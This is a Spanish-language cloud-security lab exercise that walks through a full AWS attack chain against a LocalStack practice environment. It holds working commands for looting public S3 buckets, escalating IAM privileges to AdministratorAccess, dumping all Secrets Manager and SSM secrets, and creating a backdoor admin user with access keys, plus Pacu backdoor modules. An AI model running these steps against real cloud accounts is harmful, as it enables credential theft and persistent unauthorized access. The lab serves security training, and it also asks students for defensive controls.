# Lab 06 — Cloud Attack Pipeline

## Objetivo

Encadenar todas las técnicas aprendidas en un pipeline de ataque cloud completo: desde reconocimiento hasta escalada de privilegios, extracción de secretos y persistencia.

---

## Ruta completa de ataque

```
1. OSINT cloud (subdominios, buckets, ASN)
        ↓
2. Descubrimiento de buckets S3 públicos
        ↓
3. Extracción de config.json con credenciales AWS
        ↓
4. Enumeración IAM con las credenciales obtenidas
        ↓
5. Escalada de privilegios (AttachUserPolicy / AssumeRole)
        ↓
6. DCSync cloud: secretsdump de Secrets Manager + SSM
        ↓
7. Acceso a todos los recursos (S3, Lambda, EC2)
        ↓
8. Persistencia: crear usuario backdoor + access key
```

---

## Parte 1 — OSINT Cloud (reconocimiento externo)

```bash
# Buscar buckets S3 por nombre de empresa
for name in labthinktank labthinktank-data labthinktank-backup labthinktank-dev; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        "http://localhost:4566/${name}/")
    echo "$status  $name"
done

# Buscar subdominios con S3 (vía crt.sh)
curl -s "https://crt.sh/?q=%.s3.amazonaws.com&output=json" \
    | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    names={e['name_value'] for e in data}
    [print(n) for n in sorted(names)]
except: pass
" 2>/dev/null | grep labthinktank | head -10

# Shodan — buscar activos cloud de la empresa
shodan search "org:LabThinkTank" --fields ip_str,port,product 2>/dev/null || true
```

---

## Parte 2 — Explotación S3

```bash
ENDPOINT="--endpoint-url http://localstack:4566"

# Listar bucket público
aws s3 ls s3://labthinktank-public-data $ENDPOINT --no-sign-request

# Descargar todo
aws s3 sync s3://labthinktank-public-data /tmp/s3-loot/ $ENDPOINT --no-sign-request

# Extraer credenciales
cat /tmp/s3-loot/config.json
# → db_password, api_key encontrados
```

---

## Parte 3 — Enumeración IAM automatizada

```bash
# Configurar credenciales obtenidas
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1

# Script de enumeración completa
python3 << 'EOF'
import boto3, json

session = boto3.Session(
    aws_access_key_id="test",
    aws_secret_access_key="test",
    region_name="us-east-1"
)

endpoint = "http://localstack:4566"

# Identidad actual
sts = session.client("sts", endpoint_url=endpoint)
identity = sts.get_caller_identity()
print(f"[+] Account: {identity['Account']}")
print(f"[+] ARN:     {identity['Arn']}")

# Usuarios IAM
iam = session.client("iam", endpoint_url=endpoint)
users = iam.list_users()['Users']
print(f"\n[+] IAM Users ({len(users)}):")
for u in users:
    print(f"    {u['UserName']} — created {u['CreateDate'].strftime('%Y-%m-%d')}")

# Roles
roles = iam.list_roles()['Roles']
print(f"\n[+] IAM Roles ({len(roles)}):")
for r in roles:
    print(f"    {r['RoleName']}")

# Secrets
sm = session.client("secretsmanager", endpoint_url=endpoint)
secrets = sm.list_secrets()['SecretList']
print(f"\n[+] Secrets ({len(secrets)}):")
for s in secrets:
    print(f"    {s['Name']}")
EOF
```

---

## Parte 4 — Escalada y dump de secretos

```bash
# Escalar privilegios
aws iam attach-user-policy \
    --user-name read-only-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
    $ENDPOINT

# Dump de todos los secretos
aws secretsmanager list-secrets $ENDPOINT \
    --query 'SecretList[].Name' --output text \
    | tr '\t' '\n' \
    | while read secret; do
        echo "=== $secret ==="
        aws secretsmanager get-secret-value \
            --secret-id "$secret" $ENDPOINT \
            --query 'SecretString' --output text 2>/dev/null
        echo ""
    done

# Dump de SSM Parameters
aws ssm describe-parameters $ENDPOINT \
    --query 'Parameters[].Name' --output text \
    | tr '\t' '\n' \
    | while read param; do
        echo "=== $param ==="
        aws ssm get-parameter \
            --name "$param" --with-decryption $ENDPOINT \
            --query 'Parameter.Value' --output text 2>/dev/null
        echo ""
    done
```

---

## Parte 5 — Persistencia (backdoor IAM)

```bash
# Crear usuario backdoor
aws iam create-user --user-name backup-monitor $ENDPOINT

# Asignarle admin
aws iam attach-user-policy \
    --user-name backup-monitor \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
    $ENDPOINT

# Crear access key (persistencia)
aws iam create-access-key \
    --user-name backup-monitor $ENDPOINT \
    | python3 -m json.tool
# Guardar las keys → acceso permanente aunque cambien la contraseña del usuario original
```

---

## Parte 6 — Pacu — Automatización completa

```bash
pacu
# Dentro de Pac:

# Configurar perfil LocalStack
set_keys
# Access Key ID: test
# Secret Key: test
# Endpoint: http://localstack:4566

# Ejecutar módulos en secuencia
run iam__enum_permissions
run iam__privesc_scan --escalate
run aws__enum_account
run secrets__enum
run s3__download_bucket --bucket labthinktank-public-data
run iam__backdoor_users_keys --usernames all

# Ver historial de acciones
whoami
session
```

---

## Parte 7 — ScoutSuite (reporte ejecutivo)

```bash
# Generar reporte completo del estado de seguridad de la cuenta
scout aws \
    --access-key-id test \
    --secret-access-key test \
    --region us-east-1 \
    --endpoint http://localstack:4566 \
    --report-dir /workspace/reports/scoutsuite/ \
    --no-browser

echo "[+] Reporte generado en /workspace/reports/scoutsuite/"
```

---

## Actividades

1. Ejecutar el pipeline completo de inicio a fin documentando cada paso
2. Extraer todos los secretos de Secrets Manager y SSM
3. Crear un usuario backdoor con acceso de administrador
4. Generar el reporte ScoutSuite y documentar los hallazgos en un resumen ejecutivo
5. Proponer 5 controles de seguridad que habrían impedido este ataque

---

## Mapeo MITRE ATT&CK Cloud

| Técnica | TTP |
|---------|-----|
| Cloud Storage Object Discovery | T1619 |
| Data from Cloud Storage | T1530 |
| Cloud Account Privilege Escalation | T1548 |
| Account Manipulation — Additional Cloud Credentials | T1098.001 |
| Exfiltration to Cloud Storage | T1567.002 |
